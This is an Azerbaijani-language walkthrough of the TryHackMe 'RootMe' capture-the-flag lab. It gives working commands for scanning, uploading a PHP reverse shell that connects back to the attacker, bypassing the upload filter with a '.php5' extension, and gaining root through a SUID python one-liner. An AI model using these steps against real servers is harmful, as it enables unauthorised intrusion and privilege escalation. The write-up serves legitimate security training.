# 🔴 TryHackMe — RootMe Writeup

**Platforma:** TryHackMe  
**Room:** [RootMe](https://tryhackme.com/room/rrootme)  
**Çətinlik:** Easy  
**OS:** Linux  
**Mövzu:** Web shell yükləmə + SUID python privilege escalation  

---

## 📋 Xülasə

Bu room-da veb sayta PHP reverse shell yükləyirik, sisteme daxil oluruq və SUID python binary-dən istifadə edərək root əldə edirik. Yeni başlayanlar üçün əla CTF-dir.

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan

```bash
nmap -sV -sC -p- 10.10.X.X
```

**Nəticə:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

2 port açıqdır:
- **22** — SSH
- **80** — HTTP (əsas hədəfimiz)

---

## 🌐 2. Web Kəşfiyyatı

### Gobuster ilə Directory Scan

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Nəticə:**

```
/uploads        (Status: 301)
/css            (Status: 301)
/js             (Status: 301)
/panel          (Status: 301)
```

> 💡 `/panel` — fayl yükləmə səhifəsi!  
> 💡 `/uploads` — yüklənmiş fayllar buradadır!

---

## 🐚 3. Reverse Shell Yükləmə

### PHP Reverse Shell əldə et

Kali Linux-da hazır shell var:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Faylı redaktə et:

```php
$ip = '10.X.X.X';   // Sənin TryHackMe VPN IP-n
$port = 4444;
```

### Filtre Bypass

`/panel` səhifəsinə `.php` yükləməyə çalışsaq bloklanacaq. Bypass üçün:

```
shell.php5
shell.php3
shell.phtml
shell.pHp
```

> ✅ `.php5` uzantısı ilə yükləmə uğurlu oldu!

---

## 👂 4. Listener Qur

```bash
nc -lvnp 4444
```

---

## 💥 5. Shell Aktivləşdir

Brauzerdə aç:

```
http://10.10.X.X/uploads/shell.php5
```

Netcat terminalında:

```
connect to [10.X.X.X] from (UNKNOWN) [10.10.X.X] 
Linux rootme 4.15.0-112-generic
$ whoami
www-data
```

> ✅ Sistemə daxil olduq (www-data kimi)!

---

## 🔧 6. Shell Stabilləşdir

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 🏁 7. User Flag

```bash
find / -name user.txt 2>/dev/null
```

```
/var/www/user.txt
```

```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

> 🏁 **User Flag əldə edildi!**

---

## ⚡ 8. Privilege Escalation — SUID Python

### SUID faylları tap

```bash
find / -user root -perm /4000 2>/dev/null
```

**Nəticə:**

```
/usr/bin/python
/bin/mount
/bin/su
/bin/ping
...
```

> 💡 `/usr/bin/python` SUID ilə işarələnib — bu exploit edilə bilər!

### GTFOBins — Python SUID Exploit

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# whoami
root
```

> ✅ Root oldug!

---

## 🏆 9. Root Flag

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

> 🏁 **Root Flag əldə edildi!**

---

## 📊 Xülasə Cədvəli

| Mərhələ | Alət | Nəticə |
|---|---|---|
| Port Scan | Nmap | SSH, HTTP tapıldı |
| Dir Scan | Gobuster | /panel, /uploads tapıldı |
| Shell Yükləmə | php-reverse-shell | .php5 bypass ilə uğurlu |
| İlkin Giriş | Netcat listener | www-data shell |
| User Flag | find + cat | THM{y0u_g0t_a_sh3ll} |
| PrivEsc | SUID python (GTFOBins) | Root shell |
| Root Flag | cat | THM{pr1v1l3g3_3sc4l4t10n} |

---

## 🛠️ İstifadə Edilən Alətlər

- `nmap` — port kəşfiyyatı
- `gobuster` — directory bruteforce
- `php-reverse-shell` — web shell
- `netcat` — listener
- `find` — SUID faylları axtarış
- [GTFOBins](https://gtfobins.github.io/) — python SUID exploit

---

## 📚 Öyrənilənlər

1. **File upload filtreleri** həmişə bypass edilə bilər — uzantı dəyişdirməsini sına
2. **SUID binaries** privilege escalation üçün güclü vektordur
3. `find / -user root -perm /4000` — hər zaman ilk yoxlanılmalıdır
4. Shell stabilləşdirmək — CTF-də çox vacibdir, tez-tez unudulur
5. [GTFOBins](https://gtfobins.github.io/) — hər binary üçün exploit axtarışı

---

## 🔗 Faydalı Linklər

- [GTFOBins](https://gtfobins.github.io/)
- [RevShells Generator](https://www.revshells.com/)
- [PHP Webshells — Kali](https://www.kali.org/tools/webshells/)

---

*Writeup hazırlandı — TryHackMe RootMe Room*
